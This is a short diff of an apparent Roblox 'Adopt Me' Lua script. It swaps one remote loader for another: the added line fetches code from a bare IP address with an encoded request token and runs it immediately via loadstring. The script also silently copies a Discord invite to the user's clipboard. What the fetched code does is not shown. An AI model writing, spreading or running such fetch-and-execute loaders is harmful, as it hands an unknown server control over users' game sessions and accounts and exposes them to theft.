@@ -1,4 +1,2 @@
 setclipboard("https://discord.gg/5QuSfb2nmT")
-ID="abe67d68-7c7c-4f66-9a09-0e80071cd919";
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Adopt-Me/refs/heads/main/Visual.luau"));
-loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/loader.luau"))();
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImFiZTY3ZDY4LTdjN2MtNGY2Ni05YTA5LTBlODAwNzFjZDkxOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
